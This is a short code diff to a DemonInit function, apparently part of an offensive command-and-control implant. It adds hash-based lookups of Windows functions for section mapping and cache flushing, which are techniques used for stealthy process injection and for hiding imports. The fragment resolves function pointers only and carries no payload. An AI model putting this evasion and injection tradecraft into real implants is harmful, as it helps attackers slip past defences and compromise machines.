@@ -287,6 +287,10 @@ VOID DemonInit( VOID )
         Instance.Win32.NtClose                             = LdrFunctionAddr( Instance.Modules.Ntdll, 0x8b8e133d );
         Instance.Win32.NtCreateEvent                       = LdrFunctionAddr( Instance.Modules.Ntdll, 0xca58747d );
         Instance.Win32.NtSetEvent                          = LdrFunctionAddr( Instance.Modules.Ntdll, 0x4514bd95 );
+        Instance.Win32.NtMapViewOfSection                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0x231f196a );
+        Instance.Win32.NtUnmapViewOfSection                = LdrFunctionAddr( Instance.Modules.Ntdll, 0x595014ad );
+        Instance.Win32.NtCreateSection                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0xd02e20d0 );
+        Instance.Win32.NtFlushInstructionCache             = LdrFunctionAddr( Instance.Modules.Ntdll, 0x80183adf );
 
         // Kernel32
         Instance.Win32.VirtualProtectEx                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0xd812922a );
@@ -350,6 +354,8 @@ VOID DemonInit( VOID )
         Instance.Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xd859b1d8 );
         Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, 0x72f47e1c );
         Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x5a153f58 );
+        Instance.Win32.GetProcAddress                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xcf31bb1f );
+        Instance.Win32.MultiByteToWideChar                 = LdrFunctionAddr( Instance.Modules.Kernel32, 0xe2fdda8e );
     }
 
     // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
